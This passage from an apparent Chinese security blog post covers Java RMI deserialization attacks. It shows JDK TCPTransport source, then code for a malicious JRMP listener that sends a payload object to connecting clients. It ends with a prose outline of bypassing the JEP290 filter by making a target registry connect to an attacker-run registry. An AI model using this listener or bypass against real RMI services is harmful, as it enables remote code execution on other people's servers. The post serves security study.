tcpLog.log(Log.BRIEF, &quot;decoding HTTP-wrapped call&quot;);</span><br><span class="line"></span><br><span class="line">            // It&#x27;s really a HTTP-wrapped request.  Repackage</span><br><span class="line">            // the socket in a HttpReceiveSocket, reinitialize</span><br><span class="line">            // sockIn and in, and reread magic.</span><br><span class="line">            bufIn.reset();      // unread &quot;POST&quot;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                socket = new HttpReceiveSocket(socket, bufIn, null);</span><br><span class="line">                remoteHost = &quot;0.0.0.0&quot;;</span><br><span class="line">                sockIn = socket.getInputStream();</span><br><span class="line">                bufIn = new BufferedInputStream(sockIn);</span><br><span class="line">                in = new DataInputStream(bufIn);</span><br><span class="line">                magic = in.readInt();</span><br><span class="line"></span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                throw new RemoteException(&quot;Error HTTP-unwrapping call&quot;,</span><br><span class="line">                                          e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // bufIn&#x27;s mark will invalidate itself when it overflows</span><br><span class="line">        // so it doesn&#x27;t have to be turned off</span><br><span class="line"></span><br><span class="line">        // read and verify transport header</span><br><span class="line">        short version = in.readShort();</span><br><span class="line">        if (magic != TransportConstants.Magic ||</span><br><span class="line">            version != TransportConstants.Version) &#123;</span><br><span class="line">            // protocol mismatch detected...</span><br><span class="line">            // just close socket: this would recurse if we marshal an</span><br><span class="line">            // exception to the client and the protocol at other end</span><br><span class="line">            // doesn&#x27;t match.</span><br><span class="line">            closeSocket(socket);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputStream sockOut = socket.getOutputStream();</span><br><span class="line">        BufferedOutputStream bufOut =</span><br><span class="line">            new BufferedOutputStream(sockOut);</span><br><span class="line">        DataOutputStream out = new DataOutputStream(bufOut);</span><br><span class="line"></span><br><span class="line">        int remotePort = socket.getPort();</span><br><span class="line"></span><br><span class="line">        if (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, &quot;accepted socket from [&quot; +</span><br><span class="line">                             remoteHost + &quot;:&quot; + remotePort + &quot;]&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TCPEndpoint ep;</span><br><span class="line">        TCPChannel ch;</span><br><span class="line">        TCPConnection conn;</span><br><span class="line"></span><br><span class="line">        // send ack (or nack) for protocol</span><br><span class="line">        byte protocol = in.readByte();</span><br><span class="line">        switch (protocol) &#123;</span><br><span class="line">        case TransportConstants.SingleOpProtocol:</span><br><span class="line">            // no ack for protocol</span><br><span class="line"></span><br><span class="line">            // create dummy channel for receiving messages</span><br><span class="line">            ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">            conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">            // read input messages</span><br><span class="line">            handleMessages(conn, false);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case TransportConstants.StreamProtocol:</span><br><span class="line">            // send ack</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">            // suggest endpoint (in case client doesn&#x27;t know host name)</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; +</span><br><span class="line">                    remotePort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.writeUTF(remoteHost);</span><br><span class="line">            out.writeInt(remotePort);</span><br><span class="line">            out.flush();</span><br><span class="line"></span><br><span class="line">            // read and discard (possibly bogus) endpoint</span><br><span class="line">            // REMIND: would be faster to read 2 bytes then skip N+4</span><br><span class="line">            String clientHost = in.readUTF();</span><br><span class="line">            int    clientPort = in.readInt();</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) client using &quot; + clientHost + &quot;:&quot; + clientPort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // create dummy channel for receiving messages</span><br><span class="line">            // (why not use clientHost and clientPort?)</span><br><span class="line">            ep = new TCPEndpoint(remoteHost, socket.getLocalPort(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            ch = new TCPChannel(TCPTransport.this, ep);</span><br><span class="line">            conn = new TCPConnection(ch, socket, bufIn, bufOut);</span><br><span class="line"></span><br><span class="line">            // read input messages</span><br><span class="line">            handleMessages(conn, true);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case TransportConstants.MultiplexProtocol:</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) accepting multiplex protocol&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // send ack</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line"></span><br><span class="line">            // suggest endpoint (in case client doesn&#x27;t already have one)</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +</span><br><span class="line">                    &quot;) suggesting &quot; + remoteHost + &quot;:&quot; + remotePort);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.writeUTF(remoteHost);</span><br><span class="line">            out.writeInt(remotePort);</span><br><span class="line">            out.flush();</span><br><span class="line"></span><br><span class="line">            // read endpoint client has decided to use</span><br><span class="line">            ep = new TCPEndpoint(in.readUTF(), in.readInt(),</span><br><span class="line">                                 endpoint.getClientSocketFactory(),</span><br><span class="line">                                 endpoint.getServerSocketFactory());</span><br><span class="line">            if (tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                tcpLog.log(Log.VERBOSE, &quot;(port &quot; +</span><br><span class="line">                    port + &quot;) client using &quot; +</span><br><span class="line">                    ep.getHost() + &quot;:&quot; + ep.getPort());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ConnectionMultiplexer multiplexer;</span><br><span class="line">            synchronized (channelTable) &#123;</span><br><span class="line">                // create or find channel for this endpoint</span><br><span class="line">                ch = getChannel(ep);</span><br><span class="line">                multiplexer =</span><br><span class="line">                    new ConnectionMultiplexer(ch, bufIn, sockOut,</span><br><span class="line">                                              false);</span><br><span class="line">                ch.useMultiplexer(multiplexer);</span><br><span class="line">            &#125;</span><br><span class="line">            multiplexer.run();</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            // protocol not understood, send nack and close socket</span><br><span class="line">            out.writeByte(TransportConstants.ProtocolNack);</span><br><span class="line">            out.flush();</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        // socket in unknown state: destroy socket</span><br><span class="line">        tcpLog.log(Log.BRIEF, &quot;terminated with exception:&quot;, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        closeSocket(socket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span> <span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ( !<span class="built_in">this</span>.exit &amp;&amp; ( s = <span class="built_in">this</span>.ss.accept() ) != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                    <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                    System.err.println(<span class="string">&quot;Have connection from &quot;</span> + remote);</span><br><span class="line"></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">bufIn</span> <span class="operator">=</span> is.markSupported() ? is : <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Read magic (or HTTP wrapper)</span></span><br><span class="line">                    bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(bufIn);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line"></span><br><span class="line">                    <span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> in.readShort();</span><br><span class="line">                    <span class="keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">OutputStream</span> <span class="variable">sockOut</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">                    <span class="type">BufferedOutputStream</span> <span class="variable">bufOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(sockOut);</span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bufOut);</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span> <span class="variable">protocol</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">switch</span> ( protocol ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.StreamProtocol:</span><br><span class="line">                        out.writeByte(TransportConstants.ProtocolAck);</span><br><span class="line">                        <span class="keyword">if</span> ( remote.getHostName() != <span class="literal">null</span> ) &#123;</span><br><span class="line">                            out.writeUTF(remote.getHostName());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            out.writeUTF(remote.getAddress().toString());</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.writeInt(remote.getPort());</span><br><span class="line">                        out.flush();</span><br><span class="line">                        in.readUTF();</span><br><span class="line">                        in.readInt();</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.SingleOpProtocol:</span><br><span class="line">                        doMessage(s, in, out, <span class="built_in">this</span>.payloadObject);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">case</span> TransportConstants.MultiplexProtocol:</span><br><span class="line">                        System.err.println(<span class="string">&quot;Unsupported protocol&quot;</span>);</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bufOut.flush();</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( InterruptedException e ) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">                    e.printStackTrace(System.err);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;Closing connection&quot;</span>);</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">                s.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">this</span>.ss != <span class="literal">null</span> ) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ss.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( SocketException e ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4、高版本-JDK-下的绕过"><a href="#4、高版本-JDK-下的绕过" class="headerlink" title="4、高版本 JDK 下的绕过"></a>4、高版本 JDK 下的绕过</h3><p>不想分析原理了，头疼。大概原理就是通过 JRMP 来绕过的。说白了就是 JRMPClient 这个 payload 怎么（封装才能）绕过 JEP290 的白名单校验。</p>
<p><img src="/../images/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="img"></p>
<p> JEP290 是什么呢？</p>
<p>JEP290 <code>是 Java 为了防御反序列化攻击而设置的一种过滤器，其在 JEP 项目中编号为290，因而通常被简称为</code>JEP290</p>
<ul>
<li>Provide a flexible mechanism to narrow the classes that can be deserialized from any class available to an application down to a context-appropriate set of classes. [提供一个限制反序列化类的机制，白名单或者黑名单]</li>
<li>Provide metrics to the filter for graph size and complexity during deserialization to validate normal graph behaviors. [限制反序列化的深度和复杂度]</li>
<li>Provide a mechanism for RMI-exported objects to validate the classes expected in invocations. [ 为RMI远程调用对象提供了一个验证类的机制]</li>
<li>The filter mechanism must not require subclassing or modification to existing subclasses of ObjectInputStream. [定义一个可配置的过滤机制，比如可以通过配置 properties文件的形式来定义过滤器]</li>
</ul>
<p>dgc调用栈如下图。</p>
<p><img src="/../images/image-20230823170619020.png" alt="image-20230823170619020"></p>
<p>进入源码查看可以发现只允许<code>return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</code>这些反序列化，我们构造的恶意类自然不能成功。<img src="/../images/image-20230823195747370.png" alt="image-20230823195747370"></p>
<p>下面的是注册中心的反序列化的调用链，当我们传入的是恶意类时会对系列化进行过滤。从而抛出异常。</p>
<p><img src="/../images/image-20230823200535800.png" alt="image-20230823200535800"></p>
<p><img src="/../images/image-20230823200751808.png" alt="image-20230823200751808"></p>
<p>这里我们说完了原理，然后我们来讲一下这么绕过。</p>
<p>因为在RegistryImpl&#x2F;DGCImpl加了过滤就不能在利用他们里面的反序列化了。可是我们在之前在攻击JRMP客户端那一节里提到过<code>StreamRemoteCall#executeCall</code>。这个相对更底层一点，和具体的Stub&#x2F;Skel类没有关系，调用的地方更多。</p>
<p>好了现在思路就变成了如果我们让注册中心创建一个stub并且连接我们的恶意jrmp服务，不就实现了对注册中心的攻击。现在注册中心已经跑起来了，我们知道StreamRemoteCall#execute函数只在UnicastRef里面的两个invoke调用了。现在找哪里调用invoke这个方法。这里直接其实是有三个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、RegistryImpl_Stub中的list/lookup/bind/rebind/unbind方法</span><br><span class="line">2、RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">3、DGCImpl_Stub中的dirty/clean</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们直接说结论，是DGCImpl_Stub中的dirty&#x2F;clean，在往上找在DGCClient$EndPointEntry#makeDirtyCall调用了dirty<img src="/../images/image-20230823212616409.png" alt="image-20230823212616409"></p>
<p>之后在run方法里调用了makeDirtyCall<img src="/../images/image-20230823213616740.png" alt="image-20230823213616740"></p>
<p>然后看这个线程的创建RenewCleanThread</p>
<p><img src="/../images/image-20230823213735691.png" alt="image-20230823213735691"></p>
<p>发现流程都是通的，创建一个stub后开启一个线程去执行invoke。然后我们继续向上找。EndpointEntry在哪里调用。</p>
<p>发现在look里面调用。</p>
<p><img src="/../images/image-20230823214320201.png" alt="image-20230823214320201">不写了头大，核心原理就是当客户端主动连上一个恶意的注册中心时，它是不受 JEP290 保护的，所以我们创建一个恶意中心，等着被攻击的注册中去链接。总体流程还是按照dgc的流程去走的，中间会经过一个判断，判断是否为空（只有这一个判断，其他都是很流畅的创建stub和invoke发送)。现在关键的让我又变成了让其不为空，调试发现在反序列化的过程中会触发赋值，好了，现在只需要找一个在白名单里能正常反序列化的类就可以了（这里之前忽视了一点，是可以反序列化的，但是不能反序列化恶意类，而白名单里的是可以反序列化的，所以我们才可以控制连接的IP和端口)。攻击流程是向注册中心发送存在恶意注册中心地址端口的类，就会触发让被攻击注册中心访问恶意注册中心。攻击成功</p>
]]></content>
  </entry>
</search>
